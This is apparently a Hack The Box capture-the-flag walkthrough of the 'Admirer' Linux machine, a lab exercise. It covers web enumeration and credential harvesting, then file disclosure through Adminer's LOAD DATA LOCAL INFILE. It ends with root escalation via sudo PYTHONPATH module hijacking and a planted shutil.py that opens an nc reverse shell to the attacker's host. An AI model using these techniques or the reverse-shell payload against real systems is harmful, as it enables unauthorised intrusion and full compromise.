@@ -1,0 +1,324 @@
+Admirer - Hack The Box - Easy Linux 
+
+Will look at http server port 80, find a disallowd entry in robots.txt
+
+Commands and Output:
+===================================================================================================================================
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+===================================================================================================================================
+
+FTP login is not allowed.
+
+Commands and Output:
+===================================================================================================================================
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+===================================================================================================================================
+
+Waldo might be a potential user name. Lets check to see if it is running php, go to 10.10.10.187/index.php and indeed we get a hit
+PHP works. Will use gobuster
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer]
+└──╼ $gobuster dir -u http://10.10.10.187/admin-dir/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,txt -o admin-web.txt
+===================================================================================================================================
+
+We find more webpges from the gbuster being ran against the disallowed directory.
+http://10.10.10.187/admin-dir/contacts.txt
+
+The above has a set of emails we can save to a file.
+
+We also based on the robots.txt there might be a creds.txt based on the info displayed.
+http://10.10.10.187/admin-dir/credentials.txt
+
+And we do find the info. We find an ftpuser and admin creds
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer]
+└──╼ $cat credentials.txt 
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+===================================================================================================================================
+
+
+There is most likely a wordpress page We try ftp first though
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer]
+└──╼ $ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:user): ftpuser 
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
+226 Directory send OK.
+===================================================================================================================================
+
+We copy the ftp materials and look them, for the dump file we have the version of mariadb debian 9.
+We extract the files in html tar gz and we find the index.php and in it we find waldos creds
+Commands and Output:
+===================================================================================================================================
+					<div id="main">			
+					 <?php
+                        $servername = "localhost";
+                        $username = "waldo";
+                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
+                        $dbname = "admirerdb";
+===================================================================================================================================
+
+We try sshing but it fails. Interestingly we find another robots.txt with another directory sepcifying the waldo user
+Commands and Output:
+===================================================================================================================================
+User-agent: *
+
+# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
+Disallow: /w4ld0s_s3cr3t_d1r
+===================================================================================================================================
+
+We futher more search through the contents extracted in the ftp server and find the utility scrpts directory, where we see a couple 
+of php files that could possibly run code.
+http://10.10.10.187/utility-scripts/admin_tasks.php
+We just see basic output of hardcoded entires 
+
+We ls to see what files there are 
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer/ftp/extract/utility-scripts]
+└──╼ $ls
+admin_tasks.php  db_admin.php  info.php  phptest.php
+===================================================================================================================================
+
+We find another password in db_admin.php
+
+Commands and Output:
+===================================================================================================================================
+<?php
+  $servername = "localhost";
+  $username = "waldo";
+  $password = "Wh3r3_1s_w4ld0?";
+===================================================================================================================================
+
+Let's try running another gobuster on the utilities directory
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer/ftp/extract]
+└──╼ $gobuster dir -u http://10.10.10.187/utility-scripts/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,txt -o utility-web.txt -b 403,404 -t 50
+===================================================================================================================================
+
+Based on the gobuster results we find the following:
+http://10.10.10.187/utility-scripts/adminer.php
+
+Using the creds we get access denied on all.
+
+We try to figure out what adminer is and it is basically a database management in single php file.
+We test the adminer application and specify our cmputer as the server and come to the conslusion that we could potetnially login
+if we create our sql database for authentication. Since none of creds worked.
+Commands and Output:
+===================================================================================================================================
+sudo apt install default-mysql-server
+sudo service mysql restart
+┌─[✗]─[user@parrot-virtual]─[~/htb/admirer/ftp/extract]
+└──╼ $sudo service mysql start
+[sudo] password for user:
+┌─[user@parrot-virtual]─[~/htb/admirer/ftp/extract]
+└──╼ $sudo mysql -u root
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 11
+Server version: 10.5.9-MariaDB-1 Debian buildd-unstable
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> Create database deletemewhendone;
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [(none)]> create user hacker@10.10.10.187 identified by 'dontexploitme'
+    -> ;
+Query OK, 0 rows affected (0.003 sec)
+MariaDB [(none)]> grant all on deletemewhendone.* to 'hacker'@10.10.10.187;
+Query OK, 0 rows affected (0.003 sec)
+
+MariaDB [(none)]> flush privileges;
+Query OK, 0 rows affected (0.000 sec)
+===================================================================================================================================
+
+We can try and use those creds we just created to authenticate, however we get a connection refused message. Mysql does not listen
+on a routable interface. We will use socat to route it. Or we can change the default config to listen all interfaces and connect.
+Commands and Output:
+===================================================================================================================================
+sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
+change 127.0.0.1 to 0.0.0.0
+sudo service mysql restart
+===================================================================================================================================
+
+I used the creds hacker@10.10.14.23
+password: dontexploit100010
+db: deletemewhendone
+
+And with that we log in. And can do more things with the database. There are more explanations about how the vulnerability works
+https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
+
+The gist is that we create our own databse locally and from there we authetinticate using the adminer application to our server and
+from there we can use te application to disclose files that are installed in its database by placing them in ours
+
+We go back to mysql and we want to create a table from which we can output file details to.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer/ftp/extract]
+└──╼ $sudo mysql -u root
+[sudo] password for user: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 40
+Server version: 10.5.9-MariaDB-1 Debian buildd-unstable
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> use deletemewhendone
+Database changed
+MariaDB [deletemewhendone]> create table tryme (output text(4096));
+Query OK, 0 rows affected (0.019 sec)
+
+MariaDB [deletemewhendone]>  
+
+THEN IN ADMINER:
+LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE tryme FIELDS TERMINATED BY "\n"
+
+BACK TO LOCAL MYSQL:
+MariaDB [deletemewhendone]>  select * from tryme;
+..
+..
+..
+..
+                          $servername = "localhost";                                                                              |
+|                         $username = "waldo";                                                                                    |
+|                         $password = "&<h5b~yK3F#{PaPB&dA}{H>";                                                                  |
+|                         $dbname = "admirerdb";
+..
+..
+..
+
+===================================================================================================================================
+
+Looks like those are new creds so we try them on ssh and indeed they work.
+Once in we look at what groups admin is in and find the admins group we will chec what files do they own.
+Commands and Output:
+===================================================================================================================================
+waldo@admirer:/var$ id
+uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
+waldo@admirer:/var$ groups
+waldo admins
+waldo@admirer:/var$ find / -group admins 2>/dev/null
+/opt/scripts
+/opt/scripts/backup.py
+/opt/scripts/admin_tasks.sh
+===================================================================================================================================
+
+Don't forget to run sudo -l 
+Commands and Output:
+===================================================================================================================================
+waldo@admirer:/opt/scripts$ sudo -l
+[sudo] password for waldo: 
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+
+waldo@admirer:/dev/shm$ cat /opt/scripts/backup.py 
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+===================================================================================================================================
+
+So one key thing is that the script runs the backup.py file, we might be able to take advanatge of a command or import that is.
+
+One key thing to note is that we can manipulate the SETENV of our shell, which allows us as sudo to set environment variables.
+The python script in backups.py makes the use of imports which means we can hijack whatever imports are being made in this case 
+"make_archive" which is using 3 paramters. 
+
+So we will make a custom shutil library which will have a malicious version of make_archive
+vulnerable.
+
+Commands and Output:
+===================================================================================================================================
+waldo@admirer:/dev/shm$ cat shutil.py 
+import os
+
+def make_archive(a, b, c):
+	os.system('nc 10.10.14.23 9001 -e /bin/bash')
+===================================================================================================================================
+
+NOTE: PYTHONPATH environment variable is used to add additional directories where python will look for modules and packages.
+Commands and Output:
+===================================================================================================================================
+waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 
+[sudo] password for waldo: 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/admirer/ftp/extract]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.187.
+Ncat: Connection from 10.10.10.187:44176.
+id
+uid=0(root) gid=0(root) groups=0(root)
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
